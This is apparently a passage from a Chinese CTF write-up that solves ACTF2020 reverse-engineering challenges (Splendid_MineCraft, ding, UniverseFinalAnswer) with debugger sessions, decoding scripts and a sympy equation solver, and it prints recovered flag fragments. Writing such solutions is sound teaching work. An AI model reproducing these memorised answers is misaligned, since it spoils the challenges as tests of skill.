<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>检查flag第二部分的函数需要通过刚解出的flag第一部分来解码，解码的操作是异或<code>yOu0y*</code>这六字节异或后的结果</p>
<p>因此，将输入的字符串改为<code>ACTF{yOu0y*_abcdef_ABCDEF}</code>，重新调试</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_cmp.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p2_cmp" class="fancybox"><img alt="p2_cmp" title="p2_cmp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_cmp.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>这里不是明文对比，输入的<code>a</code>被加密成了<code>0xc1</code>，加密过程如下：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_enc.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p2_encode" class="fancybox"><img alt="p2_encode" title="p2_encode" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_enc.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>加密：</p>
<blockquote>
<p><code>y = eax[ ( x &amp; 0xff) ^ 0x83 + edi ]</code></p>
</blockquote>
<p>其中<code>edi</code>用作计数范围是0~5，<code>eax</code>可以看出是个数组：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_tbl.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p2_map" class="fancybox"><img alt="p2_map" title="p2_map" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_tbl.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>解密：</p>
<blockquote>
<p><code>x = eax.offset(y) ^ (0x83 + edi)</code></p>
</blockquote>
<p>其中<code>y</code>对应的是上上上面那张图中蓝框框起来的部分（数据夹在代码中hhhh）</p>
<blockquote>
<p><code>y = [0x30, 0x4, 0x4, 0x3, 0x30, 0x63]</code></p>
</blockquote>
<p>根据<code>y</code>的值查表，得到对应的偏移量，即可解得<code>x</code>：</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_dec.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p2_dec" class="fancybox"><img alt="p2_dec" title="p2_dec" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_dec.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>flag第二部分：<code>knowo3</code></p>
<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>本来以为第三部分会更困难，没想到是直接用的<code>strcmp</code>明文对比…</p>
<p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p3_cmp.png" target="_blank" rel="noopener" data-fancybox="group" data-caption="p3" class="fancybox"><img alt="p3" title="p3" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p3_cmp.png" src="/img/loading.gif" class="lazyload"></a></p>
<p>flag第三部分：<code>5mcsM&lt;</code></p>
<h2 id="ding"><a href="#ding" class="headerlink" title="ding"></a>ding</h2><ul>
<li>题目描述：Ding! </li>
<li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/ding/ding" target="_blank" rel="noopener">ding</a></li>
<li>考察点：多线程、动态调试</li>
<li>难度：简单</li>
<li>分值：250</li>
<li>完成人数：1</li>
</ul>
<p>主要代码如下，其中<code>dest</code>位于<code>bss</code>段，<code>dest</code>函数在程序开启后初始化，所以静态分析不出来，要动态调</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">check</span><span class="params">(<span class="keyword">char</span> *s)</span></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> len_30; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= <span class="number">0x10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !dest )</span><br><span class="line">    sleep(<span class="number">1000u</span>);</span><br><span class="line">  (dest)(s);</span><br><span class="line">  len_30 = <span class="built_in">strlen</span>(enc_flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len_30; ++i )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( i != len_30 - <span class="number">1</span> &amp;&amp; !s[i] || s[i] != enc_flag[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于用了多线程，直接用gdb调试的话不行</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0xb56</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/taqini/Downloads/actf/re/Ding/ding </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</span><br><span class="line">[Attaching after Thread 0xf7fcf600 (LWP 32676) fork to child process 32680]</span><br><span class="line">[New inferior 2 (process 32680)]</span><br><span class="line">[Detaching after fork from parent process 32676]</span><br><span class="line">--- The quick brown fox knocked at the lazy dog's house ---</span><br><span class="line">[?]Password please:</span><br><span class="line">[Inferior 1 (process 32676) detached]</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</span><br><span class="line">[New Thread 0xf7db0b40 (LWP 32685)]</span><br><span class="line">[Thread 0xf7db0b40 (LWP 32685) exited]</span><br><span class="line">[New Thread 0xf75afb40 (LWP 32686)]</span><br><span class="line">[Thread 0xf75afb40 (LWP 32686) exited]</span><br><span class="line">[Inferior 2 (process 32680) exited with code 01]</span><br></pre></td></tr></table></figure></div>

<p>所以改用<code>gdb attach</code>：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./ding </span></span><br><span class="line">--- The quick brown fox knocked at the lazy dog's house ---</span><br><span class="line">[?]Password please:</span><br><span class="line">^Z</span><br><span class="line">[1]  + 32732 suspended  ./ding</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash"> <span class="built_in">fg</span></span></span><br><span class="line">[1]  + 32732 continued  ./ding</span><br></pre></td></tr></table></figure></div>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> gdb attach 32732</span></span><br></pre></td></tr></table></figure></div>

<p>动态调试的时候为了方便分析，可以<code>dump</code>出<code>dest()</code>函数</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> dump binary memory 0x565790e0 0x5657914b</span></span><br></pre></td></tr></table></figure></div>

<p>扔到ida里反编译：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">sub_0</span><span class="params">(<span class="keyword">int</span> a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp-8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ <span class="number">0x47</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) + <span class="number">6</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) - <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(MEMORY[<span class="number">0x6B</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>很简单的加密，解密即可：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">enc_flag = [<span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x17</span>, <span class="number">0x05</span>, <span class="number">0x40</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0x26</span>, <span class="number">0x2A</span>, <span class="number">0x27</span>, <span class="number">0x1C</span>, <span class="number">0x32</span>, <span class="number">0x76</span>, <span class="number">0x1C</span>, <span class="number">0x25</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x1C</span>, <span class="number">0x7E</span>, <span class="number">0x39</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x7A</span>, <span class="number">0x6F</span>, <span class="number">0x7A</span>, <span class="number">0x72</span>, <span class="number">0x3E</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc_flag:</span><br><span class="line">    flag.append(chr((i+<span class="number">2</span><span class="number">-6</span>)^<span class="number">0x47</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(flag)</span><br></pre></td></tr></table></figure></div>

<p>这题也不难，不知道为啥也没人做…</p>
<h2 id="UniverseFinalAnswer"><a href="#UniverseFinalAnswer" class="headerlink" title="UniverseFinalAnswer"></a>UniverseFinalAnswer</h2><ul>
<li><p>题目描述：</p>
<blockquote>
<p>超级计算机“deep thought”用700万年的思考得出了宇宙终极问题的答案，但是答案却遗失了。而你则是需要从它的程序中找出终极答案到底是什么。</p>
</blockquote>
</li>
<li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/UniverseFinalAnswer/UniverseFinalAnswer" target="_blank" rel="noopener">UniverseFinalAnswer</a></p>
</li>
<li><p>考察点：<strong>视力</strong>、解方程</p>
</li>
<li><p>难度：中等</p>
</li>
<li><p>分值：300</p>
</li>
<li><p>完成人数：3</p>
</li>
</ul>
<p>解十元一次方程组，输入的字符串作为十个变量，虽然flag由两部分组成，但是看程序逻辑，只要解方程对了就可以了：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> key_string; <span class="comment">// [rsp+20h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Please give me the key string:"</span>, a3);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;key_string);</span><br><span class="line">  <span class="keyword">if</span> ( equation(&amp;key_string) )&#123;</span><br><span class="line">    key_xor_to_int_str(&amp;key_string, &amp;key_string, &amp;v4);</span><br><span class="line">    <span class="comment">// key_string 按位异或,再异或9，十进制结果转为字符串作为printf第4个参数,并没有什么用</span></span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Judgement pass! flag is actf&#123;%s_%s&#125;\n"</span>, &amp;key_string);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"False key!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>flag格式:<code>actf{part1_part2}</code></p>
<blockquote>
<p>part1:方程的十个变量<br>part2:十个变量异或再异或9后的结果</p>
</blockquote>
<h3 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h3><p>方程部分代码如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">formal</span><span class="params">(<span class="keyword">char</span> *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> x1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> x3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> x4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">int</span> x5; <span class="comment">// er11</span></span><br><span class="line">  <span class="keyword">int</span> x7; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> x6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> x8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> x9; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> x10; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  x2 = a1[<span class="number">1</span>];</span><br><span class="line">  x1 = *a1;</span><br><span class="line">  x3 = a1[<span class="number">2</span>];</span><br><span class="line">  x4 = a1[<span class="number">3</span>];</span><br><span class="line">  x5 = a1[<span class="number">4</span>];</span><br><span class="line">  x7 = a1[<span class="number">6</span>];</span><br><span class="line">  <span class="comment">// 此处想打出题人,x6,x7居然反着写，导致解方程一直不对，我debug了半天才找出来。。。</span></span><br><span class="line">  x6 = a1[<span class="number">5</span>];</span><br><span class="line">  x8 = a1[<span class="number">7</span>];</span><br><span class="line">  x9 = a1[<span class="number">8</span>];</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-85</span> * x9 + <span class="number">58</span> * x8 + <span class="number">97</span> * x7 + x6 + <span class="number">-45</span> * x5 + <span class="number">84</span> * x4 + <span class="number">95</span> * x1 - <span class="number">20</span> * x2 + <span class="number">12</span> * x3 == <span class="number">12613</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    x10 = a1[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">30</span> * x10 + <span class="number">-70</span> * x9 + <span class="number">-122</span> * x7 + <span class="number">-81</span> * x6 + <span class="number">-66</span> * x5 + <span class="number">-115</span> * x4 + <span class="number">-41</span> * x3 + <span class="number">-86</span> * x2 - <span class="number">15</span> * x1 - <span class="number">30</span> * x8 == <span class="number">-54400</span></span><br><span class="line">      &amp;&amp; <span class="number">-103</span> * x10 + <span class="number">120</span> * x8 + <span class="number">108</span> * x6 + <span class="number">48</span> * x4 + <span class="number">-89</span> * x3 + <span class="number">78</span> * x2 - <span class="number">41</span> * x1 + <span class="number">31</span> * x5 - (x7 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * x9 == <span class="number">-10283</span></span><br><span class="line">      &amp;&amp; <span class="number">71</span> * x7 + (x6 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * x5 + <span class="number">-111</span> * x3 + <span class="number">85</span> * x2 + <span class="number">79</span> * x1 - <span class="number">30</span> * x4 - <span class="number">119</span> * x8 + <span class="number">48</span> * x9 - <span class="number">16</span> * x10 == <span class="number">22855</span></span><br><span class="line">      &amp;&amp; <span class="number">5</span> * x10 + <span class="number">23</span> * x9 + <span class="number">122</span> * x8 + <span class="number">-19</span> * x7 + <span class="number">99</span> * x6 + <span class="number">-117</span> * x5 + <span class="number">-69</span> * x3 + <span class="number">22</span> * x2 - <span class="number">98</span> * x1 + <span class="number">10</span> * x4 == <span class="number">-2944</span></span><br><span class="line">      &amp;&amp; <span class="number">-54</span> * x10 + <span class="number">-23</span> * x8 + <span class="number">-82</span> * x3 + <span class="number">-85</span> * x1 + <span class="number">124</span> * x2 - <span class="number">11</span> * x4 - <span class="number">8</span> * x5 - <span class="number">60</span> * x6 + <span class="number">95</span> * x7 + <span class="number">100</span> * x9 == <span class="number">-2222</span></span><br><span class="line">      &amp;&amp; <span class="number">-83</span> * x10 + <span class="number">-111</span> * x6 + <span class="number">-57</span> * x1 + <span class="number">41</span> * x2 + <span class="number">73</span> * x3 - <span class="number">18</span> * x4 + <span class="number">26</span> * x5 + <span class="number">16</span> * x7 + <span class="number">77</span> * x8 - <span class="number">63</span> * x9 == <span class="number">-13258</span></span><br><span class="line">      &amp;&amp; <span class="number">81</span> * x10 + <span class="number">-48</span> * x9 + <span class="number">66</span> * x8 + <span class="number">-104</span> * x7 + <span class="number">-121</span> * x6 + <span class="number">95</span> * x5 + <span class="number">85</span> * x4 + <span class="number">60</span> * x3 + <span class="number">-85</span> * x1 + <span class="number">80</span> * x2 == <span class="number">-1559</span></span><br><span class="line">      &amp;&amp; <span class="number">101</span> * x10 + <span class="number">-85</span> * x9 + <span class="number">7</span> * x7 + <span class="number">117</span> * x6 + <span class="number">-83</span> * x5 + <span class="number">-101</span> * x4 + <span class="number">90</span> * x3 + <span class="number">-28</span> * x2 + <span class="number">18</span> * x1 - x8 == <span class="number">6308</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">99</span> * x10 + <span class="number">-28</span> * x9 + <span class="number">5</span> * x8 + <span class="number">93</span> * x7 + <span class="number">-18</span> * x6 + <span class="number">-127</span> * x5 + <span class="number">6</span> * x4 + <span class="number">-9</span> * x3 + <span class="number">-93</span> * x2 + <span class="number">58</span> * x1 == <span class="number">-1697</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>提取出十个方程，用<code>python</code>解方程即可，这里比较坑的是出题人把<code>x6</code>和<code>x7</code>的顺序换了一下，不仔细看的话，会把这两个变量搞反。。。我就搞反了，debug的时候第一个方程总是解不对，曾一度怀疑是c语言运算出问题了。。。。（出题人，你过来，我不打你。嗯？哪里跑！）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10 = sympy.symbols(<span class="string">"x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10"</span>)</span><br><span class="line"></span><br><span class="line">b = sympy.solve(</span><br><span class="line">    [<span class="number">-85</span>*x9+<span class="number">58</span>*x8+<span class="number">97</span>*x7+x6+<span class="number">-45</span>*x5+<span class="number">84</span>*x4+<span class="number">95</span>*x1<span class="number">-20</span>*x2+<span class="number">12</span>*x3<span class="number">-12613</span>,</span><br><span class="line">    <span class="number">30</span>*x10+<span class="number">-70</span>*x9+<span class="number">-122</span>*x7+<span class="number">-81</span>*x6+<span class="number">-66</span>*x5+<span class="number">-115</span>*x4+<span class="number">-41</span>*x3+<span class="number">-86</span>*x2<span class="number">-15</span>*x1<span class="number">-30</span>*x8+<span class="number">54400</span>,</span><br><span class="line">    <span class="number">-103</span>*x10+<span class="number">120</span>*x8+<span class="number">108</span>*x6+<span class="number">48</span>*x4+<span class="number">-89</span>*x3+<span class="number">78</span>*x2<span class="number">-41</span>*x1+<span class="number">31</span>*x5-(x7*<span class="number">64</span>)<span class="number">-120</span>*x9+<span class="number">10283</span>,</span><br><span class="line">    <span class="number">71</span>*x7+(x6*<span class="number">128</span>)+<span class="number">99</span>*x5+<span class="number">-111</span>*x3+<span class="number">85</span>*x2+<span class="number">79</span>*x1<span class="number">-30</span>*x4<span class="number">-119</span>*x8+<span class="number">48</span>*x9<span class="number">-16</span>*x10<span class="number">-22855</span>,</span><br><span class="line">    <span class="number">5</span>*x10+<span class="number">23</span>*x9+<span class="number">122</span>*x8+<span class="number">-19</span>*x7+<span class="number">99</span>*x6+<span class="number">-117</span>*x5+<span class="number">-69</span>*x3+<span class="number">22</span>*x2<span class="number">-98</span>*x1+<span class="number">10</span>*x4+<span class="number">2944</span>,</span><br><span class="line">    <span class="number">-54</span>*x10+<span class="number">-23</span>*x8+<span class="number">-82</span>*x3+<span class="number">-85</span>*x1+<span class="number">124</span>*x2<span class="number">-11</span>*x4<span class="number">-8</span>*x5<span class="number">-60</span>*x6+<span class="number">95</span>*x7+<span class="number">100</span>*x9+<span class="number">2222</span>,</span><br><span class="line">    <span class="number">-83</span>*x10+<span class="number">-111</span>*x6+<span class="number">-57</span>*x1+<span class="number">41</span>*x2+<span class="number">73</span>*x3<span class="number">-18</span>*x4+<span class="number">26</span>*x5+<span class="number">16</span>*x7+<span class="number">77</span>*x8<span class="number">-63</span>*x9+<span class="number">13258</span>,</span><br><span class="line">    <span class="number">81</span>*x10+<span class="number">-48</span>*x9+<span class="number">66</span>*x8+<span class="number">-104</span>*x7+<span class="number">-121</span>*x6+<span class="number">95</span>*x5+<span class="number">85</span>*x4+<span class="number">60</span>*x3+<span class="number">-85</span>*x1+<span class="number">80</span>*x2+<span class="number">1559</span>,</span><br><span class="line">    <span class="number">101</span>*x10+<span class="number">-85</span>*x9+<span class="number">7</span>*x7+<span class="number">117</span>*x6+<span class="number">-83</span>*x5+<span class="number">-101</span>*x4+<span class="number">90</span>*x3+<span class="number">-28</span>*x2+<span class="number">18</span>*x1-x8<span class="number">-6308</span>,</span><br><span class="line">    <span class="number">99</span>*x10+<span class="number">-28</span>*x9+<span class="number">5</span>*x8+<span class="number">93</span>*x7+<span class="number">-18</span>*x6+<span class="number">-127</span>*x5+<span class="number">6</span>*x4+<span class="number">-9</span>*x3+<span class="number">-93</span>*x2+<span class="number">58</span>*x1+<span class="number">1697</span>],</span><br><span class="line">    [x1,x2,x3,x4,x5,x6,x7,x8,x9,x10,x0]    </span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> dict(b)</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">"x3"</span>: <span class="number">117</span>, <span class="string">"x7"</span>: <span class="number">95</span>, <span class="string">"x10"</span>: <span class="number">64</span>, <span class="string">"x9"</span>: <span class="number">119</span>, <span class="string">"x2"</span>: <span class="number">48</span>, <span class="string">"x6"</span>: <span class="number">121</span>, <span class="string">"x4"</span>: <span class="number">82</span>, <span class="string">"x1"</span>: <span class="number">70</span>, <span class="string">"x8"</span>: <span class="number">55</span>, <span class="string">"x5"</span>: <span class="number">84</span>&#125;</span><br><span class="line"></span><br><span class="line">part1 = chr(d[<span class="string">"x1"</span>])+chr(d[<span class="string">"x2"</span>])+chr(d[<span class="string">"x3"</span>])+chr(d[<span class="string">"x4"</span>])+chr(d[<span class="string">"x5"</span>])+chr(d[<span class="string">"x6"</span>])+chr(d[<span class="string">"x7"</span>])+chr(d[<span class="string">"x8"</span>])+chr(d[<span class="string">"x9"</span>])+chr(d[<span class="string">"x10"</span>])</span><br><span class="line"><span class="comment"># print 